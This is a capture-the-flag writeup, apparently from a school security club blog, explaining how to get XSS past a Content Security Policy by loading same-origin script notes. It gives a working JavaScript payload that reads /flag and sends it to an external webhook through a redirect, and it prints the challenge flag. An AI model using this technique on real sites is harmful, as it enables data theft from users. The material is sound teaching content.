---
layout: post
title:  "xss 2: content security policy"
date:   2021-10-04
categories: web
---

Last meeting (9/30), we split into two groups. The main group learned about CSP and tackled the challenge I'm writing up now, and the beginner group went with Alexa to learn about CTFs and get used to the format.

You can reference the lecture [here](https://docs.google.com/presentation/d/1eFQdNVU9dnio1oTWOYIOMew6aYv0ClfXtkUtp8M7_s0/edit#slide=id.p).


The goal this time is to achieve XSS, and exfiltrate data back to a server we control. The main challenge this time is not in filters, but in the CSP header, which prevents a lot of basic XSS techniques.

#### analysis
Using inspect element, we can see that the Content Security Policy that this challenge has is: `default-src 'self'; frame-src 'none'; script-src 'self' https://www.google.com/recaptcha/api.js` (go to Network tab and click around until you see it in one of the response headers:

![CSP header in inspect element](/writeups/assets/images/10-04-21/csp.png)


Deconstructed, this means:
- by default, the only place we can load from is the site (`xss2.blairsec.mbhs.edu`) itself
- iframes cannot be loaded at all
- scripts can only be loaded from either this site or the Google ReCaptcha host (the latter of which is irrelevant in this example, Jason just over-engineers his challenges)

It is also worth noting that the site is somewhat functionally different. Instead of loading a fancy styled site when we submit content, we just get plain content back.

#### achieving xss
First we need to achieve XSS. Doing
```html
<script>
    alert(1);
</script>
```

won't work because the CSP directive `script-src` does not specify `inline` as allowed. Note that `self` is allowed, meaning we can load and run scripts from the same host, but cannot run inline scripts such as the above.

To get around this, we can first upload a note containing `alert(1)` to its own path, then use `<script src="<url of javascript>"></script>` to load it. Note that our note containing JavaScript will always be on `xss2.blairsec.mbhs.edu/*`, which satisfies the CSP directive. Now we can see an alert box pop up when we view our second note.


#### exfiltrating data
Once we have XSS, all we need to do is read `/flag` and send the data to ourselves. However, the `connect-src` directive impedes this.

[`connect-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src):
```
The HTTP Content-Security-Policy (CSP) connect-src directive restricts the URLs which can be loaded using script interfaces. The APIs that are restricted are:

<a> ping,
fetch(),
XMLHttpRequest,
WebSocket,
EventSource, and
Navigator.sendBeacon().
```

Because the server does not explicitly set `connect-src`, it is inherited by the `default-src` directive, which is set to only `self`. This means that we can run `fetch()` to read the data at `/flag`, but we cannot use `fetch()` to send data to ourselves at an external host.

Of course this is easily bypassable by using a redirect instead of sending a request (set `window.location` attribute).

Our final JavaScript payload might look something like:
```javascript
fetch("/flag").then(resp => resp.text().then(flag => location=("https://webhook.site/15613e6c-16cf-440b-9a5d-4b533c1dae02/?"+encodeURIComponent(flag))))
```

and our note to trigger it (the one we report) will be:
```html
<script src="/sites/b9d9907c-0403-4695-95be-efd033b90453"></script>
```

Note the UUIDs (for the webhook and the note link) are the ones I got for the solution, but they will be different when you are solving it.

Flag: `flag{csp_more_like_cspepega}`

~ josh